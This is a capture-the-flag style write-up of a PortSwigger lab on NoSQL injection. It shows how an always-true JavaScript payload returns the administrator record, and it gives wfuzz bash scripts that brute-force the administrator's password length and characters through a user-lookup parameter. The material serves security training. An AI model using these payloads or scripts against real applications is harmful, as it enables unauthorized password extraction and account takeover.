# Exploiting NoSQL injection to extract data

**Lab Url**: [https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-data](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-data)

![Lab Description](img/lab-description.png)

## Analysis

As usual, the initial step is to understand how the vulnerable application works and gather information about the target system. The application has a `My account` page that redirects to `login` page if a user is not logged in.

After logging in to the application with the given credentials, the network tab reveals an interesting URL. The application looks for a user with a given username (`/user/lookup?user=wiener`).

Let's append an apostrophe (`'`) at the end of the user parameter. Surprisingly, the application returned a message saying, "**There was an error getting user details.**".

```json
{
  "message": "There was an error getting user details"
}
```

Maybe our apostrophe (`'`) breaks the query syntax. Now let's inject a JavaScript condition that always evaluates to true, such asÂ `'||'0'=='0`. And observe how response changes. Hmm, we were able to get an administrator user. This is probably because the query is returning all users, and the first user, the administrator user is being returned.

![Administrator User](img/user-lookup.png)

Now that we know that the database evaluates javascript as part of the query, we can try to get the length of the password of the administrator user.

*Use the below script to determine the length of the administrator password.*

```bash
echo {0..9} | tr ' ' '\n' > range.txt
```

```bash
#!/bin/bash

wfuzz -X GET \
    -u "https://YOUR-LAB-ID.web-security-academy.net/user/lookup?user=administrator'%26%26this.password.length=='FUZZ" \
    -b "session=YOUR-SESSION-KEY" \
    -w range.txt \
    --hs '"message"\s*:\s*"Could not find user"'
```

**Now, deduce the administrator password character by character. I am going to use wfuzz because, Burp (community edition) intruder tab is very slow.**

Extract the password character by character starting from index 0 to 7.

```bash
echo {0..9} {a..z} {A..Z} | tr ' ' '\n' > chars.txt
```

```bash
#!/bin/bash

for c in {0..7}; do
  wfuzz -X GET \
      -u "https://YOUR-LAB-ID.web-security-academy.net/user/lookup?user=administrator'%26%26this.password[${c}]=='FUZZ" \
      -b "session=YOUR-SESSION-KEY" \
      -w chars.txt \
      --hs '"message"\s*:\s*"Could not find user"'
done
```

After getting the password, log in as an administrator user to solve this lab.

![Lab Solved](img/lab-solved.png)
